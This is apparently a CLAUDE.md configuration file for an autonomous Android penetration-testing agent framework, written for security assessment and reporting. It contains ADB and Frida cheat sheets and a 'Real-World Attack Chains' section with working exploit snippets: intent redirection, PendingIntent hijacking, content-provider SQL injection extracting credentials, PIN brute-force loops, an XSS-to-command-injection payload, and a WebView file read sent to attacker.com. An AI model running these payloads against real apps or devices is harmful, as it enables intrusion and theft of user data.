# Android Pentest Agent

Autonomous Android application security testing framework powered by Claude Code agents.

## Project Overview

This framework automates Android penetration testing through specialized agents:
- `/orchestrator` - Master coordinator that runs all phases
- `/android-static` - Static analysis (scanner + manual code review)
- `/android-dynamic` - Dynamic analysis (ADB, Frida, runtime checks)
- `/native-fuzzer` - Native library analysis and fuzzing
- `/exploit-dev` - PoC creation and exploit verification

**No API testing** - use [transilienceai/communitytools](https://github.com/transilienceai/communitytools) for web/API.

## Tool Paths

| Tool | Path |
|---|---|
| Static scanner | `/Users/gaurangbhatnagar/Documents/android-security-scanner/backend/scanner.py` |
| Scanner venv | `/Users/gaurangbhatnagar/Documents/android-security-scanner/backend/venv/bin/python3` |
| Frida SSL bypass | `.claude/scripts/frida-ssl-bypass.js` |
| Device check | `.claude/scripts/device-check.sh` |
| UI parser | `.claude/scripts/ui.py` |
| Biometric bypass (null crypto) | `.claude/scripts/fingerprint-bypass.js` |
| Biometric bypass (with crypto) | `.claude/scripts/fingerprint-bypass-crypto.js` |
| Crypto hooks | `.claude/scripts/crypto_hooks.js` |
| Keystore hooks | `.claude/scripts/keystore_hooks.js` |
| Root bypass | `.claude/scripts/root_bypass.js` |
| Content provider scanner | `.claude/scripts/content_provider_scanner.py` |
| Intent fuzzer | `.claude/scripts/intent_fuzzer.py` |
| Medusa | `git clone https://github.com/Ch0pin/medusa.git` (external) |
| mobile-mcp | MCP server for device interaction (installed) |
| Attack payloads | `.claude/skills/exploit-dev/payloads/` (intent, SQLi, path traversal, XSS, XXE) |

## UI Interaction: mobile-mcp + ui.py Hybrid

**Observe** with `ui.py` (numbered element list with type classification).
**Act** with mobile-mcp MCP tools (native Claude integration, no shell-out).

| Action | mobile-mcp Tool |
|---|---|
| Tap | `mobile_click_on_screen_at_coordinates(device, x, y)` |
| Type | `mobile_type_keys(device, text, submit)` |
| Swipe | `mobile_swipe_on_screen(device, direction)` |
| Back/Home | `mobile_press_button(device, "BACK"/"HOME")` |
| Screenshot | `mobile_take_screenshot(device)` (returns inline image) |
| Save screenshot | `mobile_save_screenshot(device, saveTo)` |
| Launch app | `mobile_launch_app(device, packageName)` |
| Install | `mobile_install_app(device, path)` |
| Open URL | `mobile_open_url(device, url)` |
| Screen record | `mobile_start_screen_recording(device, output)` |
| List elements | `mobile_list_elements_on_screen(device)` (simpler than ui.py) |

## Output Structure

All agent outputs go to `outputs/YYYYMMDD_<package_name>/`:
```
outputs/20260412_com.example.app/
  static/           # Scanner JSON + verified findings
    scanner_results.json
    work/            # Decompiled sources (scanner work dir)
    verified_findings.json
  dynamic/           # Runtime test results + evidence
  native/            # Native lib analysis + crash logs
  exploits/          # PoC scripts + evidence
  report.md          # Consolidated final report
```

## Scanner Output Format (Contract v0.4.0)

The static scanner outputs JSON with these key sections:
- `metadata` - APK info, scan timestamp, versions
- `engines` - Per-engine findings (manifest, pattern, heuristic, taint)
- `manifest` - Parsed AndroidManifest.xml facts (package, components, permissions)
- `summary` - Finding counts by severity and authority

Each finding contains:
```
id, title, severity (critical/high/medium/low), authority, confidence,
category, evidence, remediation, references, engine, code_snippets[]
```

`manifest.components` lists all activities, services, receivers, providers with export status.

## Android Security Quick Reference

### Vulnerability Classes | Detect Via | Exploit Via
| Vuln | Static | Dynamic | Exploit |
|---|---|---|---|
| Exported components (no permission) | Manifest scan | `am start/startservice/broadcast` | ADB intent |
| Content provider injection | Manifest + code | `content query` | ADB / PoC app |
| Deep link hijacking | Manifest intent-filters | `am start -d <uri>` | PoC app |
| WebView JS interface | Code pattern | Frida hook | Crafted URL/intent |
| Insecure data storage | Code pattern | `cat /data/data/<pkg>/` | ADB shell (root) |
| Hardcoded secrets | Pattern/heuristic | - | Direct use |
| Weak crypto (ECB/DES/MD5) | Pattern engine | Frida hook crypto | Key extraction |
| SSL pinning absent | Code review | mitmproxy | Traffic intercept |
| Debuggable app | Manifest flag | `adb shell run-as` | Attach debugger |
| Backup enabled | Manifest flag | `adb backup` | Data extraction |
| Intent injection | Taint analysis | Frida + crafted intent | ADB/PoC app |
| Path traversal (provider) | Code review | `content query` with traversal | ADB |
| Tapjacking | Manifest + overlay | UI test | PoC overlay app |
| Task hijacking | Manifest launchMode | Activity launch | PoC app |
| Clipboard leak | Code pattern | Frida hook clipboard | Monitor clipboard |
| Log leak | Code pattern | `logcat` filter | ADB logcat |
| Root detection bypass | Code pattern | Frida hook | Frida script |
| Broadcast theft | Manifest receivers | `am broadcast` | PoC receiver app |

### ADB Cheat Sheet
```bash
# Connection
adb connect <ip>:<port>
adb devices
adb shell su -c id                      # Check root

# App management
adb install -r <apk>                    # Install/reinstall
adb shell pm list packages | grep <pkg> # Find package
adb shell pm path <pkg>                 # Get APK path
adb shell dumpsys package <pkg>         # Full package info

# Component testing
adb shell am start -n <pkg>/<activity>
adb shell am start -n <pkg>/<activity> --es key value
adb shell am startservice -n <pkg>/<service>
adb shell am broadcast -a <action> --es key value
adb shell content query --uri content://<authority>/<path>
adb shell am start -a android.intent.action.VIEW -d "<deeplink>"

# Data extraction (root)
adb shell su -c "cat /data/data/<pkg>/shared_prefs/*.xml"
adb shell su -c "ls -laR /data/data/<pkg>/"
adb shell su -c "sqlite3 /data/data/<pkg>/databases/*.db .dump"

# Logging
adb logcat --pid=$(adb shell pidof <pkg>) -v time
adb logcat -b crash

# Backup
adb backup -apk -shared <pkg>

# Screenshot/screenrecord
adb shell screencap /sdcard/screen.png && adb pull /sdcard/screen.png
```

### Frida Quick Reference
```bash
# Attach to running app
frida -U -n <process_name> -l script.js

# Spawn and attach
frida -U -f <pkg> -l script.js --no-pause

# List processes
frida-ps -U

# Remote device
frida -H <ip>:<port> -f <pkg> -l script.js
```

## Real-World Attack Chains (from writeups)

These are proven exploitation patterns from real CVEs and CTF challenges. Use as templates when encountering similar vulnerabilities.

### Intent Redirection (Privilege Escalation)
Target reads `android.intent.extra.INTENT` or `extra_intent` and calls `startActivity()` on it. Attacker wraps a privileged intent inside a legitimate intent to the exported activity. The forwarded intent runs under the target's permissions.
```
# Samsung Dialer SVE-2025-1217: CALL_PHONE -> CALL_PRIVILEGED escalation
Intent extra = new Intent("android.intent.action.CALL_PRIVILEGED");
extra.setData(Uri.parse("tel://911"));
Intent i = new Intent();
i.setComponent(new ComponentName("com.samsung.android.dialer", "...WidgetDuoCallStarterActivity"));
i.putExtra("android.intent.extra.INTENT", extra);
```

### PendingIntent Hijacking (Data Theft)
Obtain PendingIntent from notification, SliceProvider, or MediaBrowserService. Modify fillIn fields (clipdata, package) to redirect data to attacker app. Attacker adds FLAG_GRANT_READ_URI_PERMISSION to steal ContentProvider data.
```java
PendingIntent pi = sbn.getNotification().contentIntent;
Intent hijack = new Intent();
hijack.setPackage(getPackageName());
hijack.setClipData(ClipData.newRawUri(null, Uri.parse("content://contacts/people")));
hijack.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
pi.send(getApplicationContext(), 0, hijack, null, null);
```

### Path Traversal via getLastPathSegment()
`Uri.getLastPathSegment()` URL-decodes once, so `..%2F..%2F` becomes `../../` after parsing. Combine with file write primitive to overwrite app files.
```bash
# MHL DocumentViewer: write malicious .so to native-libraries path
adb shell am start -n <pkg>/.MainActivity -a android.intent.action.VIEW \
  -d "http://attacker/..%2F..%2Fdata%2Fdata%2F<pkg>%2Ffiles%2Fnative-libraries%2Farm64%2Flibevil.so"
```

### Dynamic Code Loading (DCL) Hijack
App loads .dex/.so from writable path (external storage, app files dir). Write malicious payload to that path, trigger load.
```bash
# Compile Java to DEX for DexClassLoader hijack
javac Exploit.java
jar cvf Exploit.jar Exploit.class
d8 --output . Exploit.jar
mv classes.dex com.target.plugin.Exploit.dex
adb push com.target.plugin.Exploit.dex /sdcard/plugins/
```

### Unity dlopen() RCE (CVE-2025-59489)
Unity apps accept `-xrsdk-pre-init-library <path>` via intent "unity" extra. Combined with any file-write primitive (deeplink download), gives full RCE.
```
intent://update#Intent;scheme=runtimetoad;package=<pkg>;S.unity=-xrsdk-pre-init-library%20/data/data/<pkg>/files/libevil.so;end;
```

### WebView file:// + allowUniversalAccessFromFileURLs
When WebView has JS enabled + `allowUniversalAccessFromFileURLs(true)`, JavaScript from file:// can XHR any local file and exfiltrate it.
```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///data/user/0/<pkg>/shared_prefs/Prefs.xml', false);
xhr.send();
fetch('https://attacker.com/steal?data=' + btoa(xhr.responseText));
```

### SnakeYAML Deserialization RCE (CVE-2022-1471)
If app uses `yaml.load()` (unsafe deserialization), inject YAML with `!!` type tag pointing to a class whose constructor executes commands.
```yaml
!!com.target.app.LegacyCommandUtil ["touch /data/data/<pkg>/pwned"]
```

### Content Provider SQL Injection
```bash
# UNION-based extraction
adb shell content query --uri content://<authority>/users --where "1=1) UNION SELECT sql,2,3 FROM sqlite_master--"
# Extract specific data
adb shell content query --uri content://<authority>/users --where "1=1) UNION SELECT username,password,3 FROM credentials--"
```

### Exported Service/Receiver Brute-Force
Weak PINs protecting exported components can be brute-forced via ADB.
```bash
# MHL IoT Connect: 3-digit AES key
for ((i=1; i<=999; i++)); do adb shell am broadcast -a MASTER_ON --ei key $i; done
# MHL Secure Notes: 4-digit PIN on ContentProvider
for i in {0001..9999}; do adb shell content query --uri content://<authority> --where pin=$i; done
```

### Native Buffer Overflow -> system() Hijack
JNI parse function copies input to fixed buffer without bounds check. Adjacent `system()` call argument gets overwritten.
```javascript
// Frida: inject overflow payload
MainActivity["parse"].implementation = function(str){
    var payload = JavaString.$new("A".repeat(100) + "id > /data/data/<pkg>/poc.txt;#");
    return this["parse"](payload);
};
```

### XSS -> JS Interface -> Command Injection Chain
Deep link decodes base64 -> renders in WebView -> XSS triggers `@JavascriptInterface` method -> shell command injection.
```bash
# Base64-encode XSS payload for deep link
echo -n '<img src=x onerror=WebAppInterface.postCowsayMessage("moo;id;")>' | base64
adb shell am start -a android.intent.action.VIEW -d "postboard://postmessage/<base64_payload>"
```

### Implicit Broadcast Credential Theft
App broadcasts credentials via implicit intent. Attacker app registers receiver for same action with high priority.
```xml
<receiver android:name=".TheftReceiver" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.target.action.BROADCAST" />
    </intent-filter>
</receiver>
```

### Samsung Exported WebView with JS Bridge
Exported WebView activities accepting URL extras + JavaScript interfaces = attacker loads arbitrary page with access to device APIs.
```bash
# Samsung Smart Touch Call 0-day
adb shell am start -n com.samsung.android.visualars/.web.activity.WebViewActivity \
  -a android.intent.action.VIEW --es URL "https://attacker.com/exploit.html" --es httpMethod "POST"
```

### Chromium Intent URI Chaining
Chain browsable intents through trusted Google apps (GMS, Scene Viewer, Face Viewer) to reach non-browsable targets. Use `intent://` URI scheme with intermediary packages.

### URL Validation Bypasses
| Check | Bypass |
|---|---|
| `url.endsWith("target.com")` | `https://evil.com?x=target.com` |
| `getQueryParameter("url")` with suffix check | `https://target?url=evil.com?x=target.com` (double `?`) |
| Host check only | `https://target@evil.com` or `https://evil.com#target` |

### setResult() Intent Reflection (URI Permission Theft)
Exported activity that calls `setResult(RESULT_OK, getIntent())` reflects attacker's flags back. Attacker sends intent with `FLAG_GRANT_READ_URI_PERMISSION` + content:// URI, gets file access on the reflected result. (CVE-2021-41256 Nextcloud, InsecureShopV2)

### Samsung System Intent Injection (CVE-2022-22292)
Samsung Telecom app's dynamic broadcast receiver accepts `extra_call_intent` Parcelable without permission, calls `startActivity()` as UID system. Zero-permission factory reset, app install/uninstall, CA cert install, emergency calls.

### WebView DownloadListener Cookie Theft (Xiaomi)
Exported WebView activity + DownloadListener that attaches auth cookies to download requests. Attacker serves page with `Content-Disposition: attachment`, cookies sent to attacker server.

### JS Bridge Whitelist Bypass via Firebase Storage
WebView JS bridge validates URL domain, but whitelist includes user-controllable hosting (Firebase Storage, S3). Attacker uploads malicious HTML to Firebase, URL passes whitelist check, JS calls bridge methods.

### shouldOverrideUrlLoading Inversion
`shouldOverrideUrlLoading` returning `false` = WebView LOADS the URL (not blocks). Combined with open redirect on whitelisted domain = full WebView hijack.

### File Theft via ACTION_PICK Interception
App uses implicit `startActivityForResult(ACTION_PICK)`. Attacker registers high-priority picker, returns `file:///data/data/target/` URI. App processes "selected file" = data exfiltrated.

### Zip Slip Archive Traversal
Zip entry with `../../evil.so` filename extracted without path validation writes outside destination dir. On Android: overwrite native libs for code execution.

### Fragment Injection in PreferenceActivity
`Fragment.instantiate()` with untrusted EXTRA_SHOW_FRAGMENT extra = instantiate arbitrary Fragment subclass with attacker-supplied arguments.

### Dirty Stream (Share Target Path Traversal)
Attacker's ContentProvider returns crafted `DISPLAY_NAME` like `../../shared_prefs/auth.xml` when target app calls `openInputStream()` during ACTION_SEND. Target writes received data using traversal filename into its private dir. Overwrite SharedPrefs, native libs, or DEX for code execution. (Microsoft, BH Asia 2023)

### Parcel/Bundle Mismatch (LaunchAnywhere)
ClassLoader confusion during Bundle deserialization causes Parcel key/value alignment shift. System reads attacker's Intent from shifted position, calls `startActivity()` with system privileges. Recurring pattern in Android system bugs. (BH Europe 2022)

### AutoSpill (Password Manager Credential Theft)
Autofill framework fills WebView login fields but also leaks to hosting app's native views. Malicious app with embedded WebView login captures autofilled credentials. (BH Europe 2023)

### PiP Overlay Hijacking
Picture-in-Picture windows bypass traditional overlay detection (`TYPE_APPLICATION_OVERLAY`). Can overlay permission dialogs, biometric prompts, payment confirmations. Check for `filterTouchesWhenObscured` in sensitive activities. (BH Asia 2024)

### Debug Module Exploitation
OEM vendors leave debug/engineering/factory activities in production builds. Discover via `dumpsys package | grep -iE "debug|engineer|factory"`. Try dial codes: `*#*#4636#*#*`, `*#*#197328640#*#*`. (BH Asia 2024)

### Samsung Clipboard -> TTS -> Kernel Chain
Samsung clipboard provider runs as system without access control. Write malicious .so via `_data` column manipulation, load via SamsungTTS `System.load()`, pivot to kernel via GPU driver. (CVE-2021-25337/25369/25370, Project Zero)

### Quick Share RCE
File transfer path traversal in received filename + auto-execution trigger. Same pattern applies to any app with file receiving (Bluetooth OBEX, WiFi Direct, custom protocols). (BH Asia 2025)

### android.net.Uri Parsing Bypass
`Uri.parse("attacker.com?://victim.com/")` returns host=`victim.com`, but WebView loads `attacker.com`. Use HSTS preload domains (e.g., `httpsredirector.com`) to force HTTPS without explicit scheme. Fix: use `java.net.URI` not `android.net.Uri` for validation. (Tokopedia $500)

### Content Provider _display_name Path Traversal
Attacker ContentProvider returns `../../lib-main/libyoga.so` via `_display_name` cursor. Target caches file at traversed path = native library overwrite = persistent RCE. (Mattermost HackerOne #1115864)

### Self-Referencing Provider URI
App blocks `file:///data/data/pkg/...` but its own `content://pkg.provider/?final_path=/data/data/pkg/...` resolves to same file. Chain with unvalidated `dialogId` for zero-click file exfil. (Telegram session theft)

### Jetpack Navigation Fragment Hijack
Any app with exported activity + `NavHostFragment`: send `android-support-nav:controller:deepLinkIds` int[] extra to open ANY fragment, bypassing auth screens. Get IDs via Frida or jadx `R.id` class.

### SharedPreferences .bak Injection
Write `shared_prefs/config.xml.bak` instead of `.xml`. Android auto-restores .bak files on next load, replacing the original. Redirect app to attacker server, steal tokens.

### Mobile SSRF via Deep Links
Path traversal in API params: `username=../../admin/settings%3femail=evil@gmail.com`. Double-slash trick: `//attacker.com/path` interpreted as absolute URI by OkHttp. `.contains("whitelist.com")` bypassed by `whitelist.com.evil.com`.

### Intent-Filter Bypass
Intent-filters are NOT security boundaries. Direct component invocations (`setComponent()`) completely bypass filter URI/scheme/host restrictions on exported activities.

### TikTok RCE Chain (5-stage)
XSS via URL fragment injection (`#` bypasses encoding in evaluateJavascript) -> JS bridge `invokeMethod("openSchema")` -> `javascript://` scheme bypass hostname validation -> intent scheme to non-exported activity in split APK -> Zip Slip with disabled security check (boolean always false) -> native .so overwrite. Always check split APKs: `adb shell pm path <pkg>`.

### Static Field Cookie Leak (LinkedIn)
`WebViewerFragment.CUSTOM_HEADERS` is static - cookies from LinkedIn URL persist when attacker URL loads. Chain: `javascript://` scheme host bypass + unanchored regex `.find()` bypass + JS interface `sendWebMessage()`. Passive exploitation via ad clicks possible.

### ContentProvider SQL Injection (ownCloud)
String concatenation in `where` clause: `"col = 1 AND (" + selection + ")"`. Exfiltrate via UPDATE + subquery injecting stolen data into readable column. Blind SQLi via boolean-based character enumeration.

### Split APK Hidden Attack Surface
Vulnerabilities in split APKs (`split_df_miniapp.apk`) not visible in base APK decompilation. TikTok RCE lived in split. List all splits: `adb shell pm path <pkg>`. Decompile each separately.

### Third-Party SDK Exported Components
SDK activities merged into manifest may be unintentionally exported (SurveyMonkey `SMFeedbackActivity`). Always audit merged manifest, not just source manifest.

### APEX Certificate Bypass (Android 14+)
Root CAs moved to `/apex/com.android.conscrypt/cacerts`. Must bind-mount combined certs there (not just `/system/etc/security/cacerts`). Android 15+: use `--rbind` for recursive bind mount.

### Flutter App Testing
- Flutter ignores system proxy: use ProxyDroid or iptables to redirect traffic
- SSL pinning in `libapp.so`: use NVISO Flutter bypass script (pattern scans for cert validation offset)
- Burp invisible proxy mode required for interception

## Android Version Attack Feasibility

Always check `targetSdkVersion` and `minSdkVersion` to determine which attacks apply.

| Target API | Key Attacks Available |
|---|---|
| < 24 (< Android 7) | User CAs trusted (easy MITM), cleartext HTTP, all intent attacks, full storage access |
| 24-28 (7-9) | Need Frida for MITM, cleartext may work (<28), StrandHogg, most component attacks |
| 29-30 (10-11) | WebView file access off, background launch blocked, StrandHogg patched, scoped storage |
| 31-33 (12-13) | Exported flag required, overlay tapjack mitigated, intent filter matching, sideload restrictions |
| 34+ (14+) | DCL read-only, min targetSdk enforced. Focus: logic flaws, provider injection, JS bridges |
| 36 (16) | Intent redirection blocked by default. Focus: WebView misconfig, provider injection, Frida |

**Critical version boundaries:**
- API 24: User CAs untrusted (MITM needs root/Frida)
- API 28: Cleartext HTTP off by default
- API 29: WebView file access off, background activity launch blocked
- API 31: `android:exported` must be explicit
- API 34: DCL files must be read-only
- API 36: Intent redirection default protection

## OWASP MASTG Coverage

All tests must align with OWASP MASTG (139 tests, 8 MASVS categories). Full checklist: `.claude/skills/orchestrator/reference/owasp-mastg-checklist.md`

Key categories and test counts:
| Category | Tests | Primary Agent |
|---|---|---|
| MASVS-STORAGE | 20 | Static + Dynamic |
| MASVS-CRYPTO | 15 | Static + Dynamic (Frida tracers) |
| MASVS-AUTH | 7 | Static + Dynamic (biometric bypass) |
| MASVS-NETWORK | 23 | Static + Dynamic (proxy/Medusa) |
| MASVS-PLATFORM | 26 | Static + Exploit (PoC apps) |
| MASVS-CODE | 15 | Static + Native fuzzer |
| MASVS-RESILIENCE | 23 | Static + Dynamic (bypass tests) |
| MASVS-PRIVACY | 7 | Static + Dynamic |

## Exploitation Testing Checklist

Ordered workflow for testing each Android app:

### 1. Manifest Analysis
- [ ] Exported activities/services/receivers/providers
- [ ] Deep link schemes (browsable intents)
- [ ] NFC intent-filters
- [ ] Custom permissions with `normal`/`dangerous` level
- [ ] `grantUriPermissions="true"` on providers
- [ ] FileProvider path declarations (root-path, external-path)
- [ ] Debug/factory/engineering activities

### 2. Intent Attack Surface (per exported component)
- [ ] Send intents with crafted extras via ADB
- [ ] Test deep links from browser (browsable)
- [ ] Check for intent redirection (`getParcelableExtra("intent")` -> `startActivity()`)
- [ ] Check for `startActivityForResult()` with implicit intents (MIME type hijack)
- [ ] Check for `setResult(getIntent())` (URI permission reflection)

### 3. WebView Analysis
- [ ] `setJavaScriptEnabled` + `addJavascriptInterface` = JS bridge RCE
- [ ] `setAllowUniversalAccessFromFileURLs` = file theft via XHR
- [ ] URL validation bypass (endsWith, double ?, scheme confusion)
- [ ] `shouldOverrideUrlLoading` return value logic
- [ ] DownloadListener cookie attachment
- [ ] Debug via `chrome://inspect`

### 4. Content Provider Testing
- [ ] Query exported providers: `adb shell content query --uri`
- [ ] SQL injection: `--where "1=1) UNION SELECT ...--"`
- [ ] Path traversal: `content://<auth>/..%2F..%2F`
- [ ] Unexported providers via URI permission grants

### 5. Dynamic Code Loading
- [ ] DexClassLoader/PathClassLoader from writable paths
- [ ] System.loadLibrary from writable paths (native lib hijack)
- [ ] Play Core splitcompat directory
- [ ] dlopen with controllable paths

### 6. Permission & Broadcast
- [ ] Custom permissions with `normal`/`dangerous` level
- [ ] Implicit broadcasts with sensitive data
- [ ] Dynamic receivers without permission parameter
- [ ] PendingIntent with FLAG_MUTABLE + no explicit component

### 7. Data Storage (root)
- [ ] SharedPreferences with plaintext credentials
- [ ] Unencrypted SQLite databases
- [ ] World-readable files
- [ ] External storage sensitive data
- [ ] Logcat credential leaks

### 8. API Key Validation
- [ ] Extract keys from strings.xml, BuildConfig, code
- [ ] Validate exploitability per KeyHacks (99 services)
- [ ] AWS Cognito, Firebase, Google Maps, Stripe, etc.

## Agent Rules

1. Device identifier required for dynamic testing: IP:port (WiFi) or USB serial number. If contains `:` -> `adb connect <id>`. Otherwise -> `adb -s <serial>`. All ADB commands must use `adb -s <device_id>`.
2. If device is not rooted, warn user and ask before continuing (many checks skipped)
3. All output goes to `outputs/` directory with date-prefixed package folders
4. Static analysis always runs first - its findings feed into dynamic and exploit phases
5. Never do API/web testing - out of scope
6. Each finding must have: severity, evidence, exploitation path, and remediation

## Exploitation & Reporting Rules

### PoC Apps Are Mandatory
For intent/broadcast/provider/WebView/deep link findings, **always create a PoC Android app** that demonstrates third-party app exploitation. ADB-only proves reachability but not real-world exploitability. Write complete Java source + AndroidManifest.xml + BUILD_INSTRUCTIONS.md to the exploits/ output directory.

### Report Quality
Every finding in the report MUST include:
- **Description**: 3-5 sentences explaining the vulnerability, root cause, missing security control
- **Vulnerable Code**: Code snippet with file:line reference
- **Impact**: Real-world attacker impact, prerequisites, business impact
- **Proof of Concept**: Attack scenario, PoC app reference, ADB command, screenshots, logcat
- **Remediation**: Specific code fix with before/after examples, Android API references

### Evidence Collection
- Before/after screenshots for every exploited finding
- Use `pidcat <package>` for logging (cleaner than raw logcat). Fallback: `adb logcat --pid=$(adb shell pidof <pkg>)`
- Save all PoC source code, Frida scripts, and exploit output to the outputs/ directory
- Generate both .md and .docx report formats

## Native Fuzzing Safety (CRITICAL)

**These rules prevent device reboots and kernel crashes:**

1. **Max fuzz payload: 512 bytes.** NEVER send buffers >512 bytes to JNI functions. Large buffers (10KB+) overflow kernel allocations and reboot the device.
2. **BANNED payloads:** `%n` (memory write), `%s` repeated (pointer dereference), `%x` repeated (stack leak). These crash printf internals at kernel level.
3. **500ms delay between fuzz cases.** Rapid-fire crashes overwhelm the device.
4. **Stop on first crash.** Collect tombstone, report finding, move on. Never continue fuzzing after a crash.
5. **Never fuzz system processes** (UID 1000/0). Check with `adb shell ps` first.
6. **One pass only.** No loops, no retries on the same function.
7. **Escalate gradually:** null -> empty -> 64 bytes -> 128 -> 256 -> 512. Stop at first crash size.


<claude-mem-context>
# Recent Activity

<!-- This section is auto-generated by claude-mem. Edit content outside the tags. -->

### Apr 12, 2026

| ID | Time | T | Title | Read |
|----|------|---|-------|------|
| #1357 | 7:37 PM | 🟣 | CLAUDE.md Knowledge Base Enhanced with 9 New Android Attack Patterns | ~637 |

### Apr 13, 2026

| ID | Time | T | Title | Read |
|----|------|---|-------|------|
| #1473 | 11:45 AM | ✅ | OWASP MASTG Testing Standards Integrated | ~429 |
| #1465 | 11:37 AM | ✅ | Exploitation and Reporting Standards Documented | ~527 |
</claude-mem-context>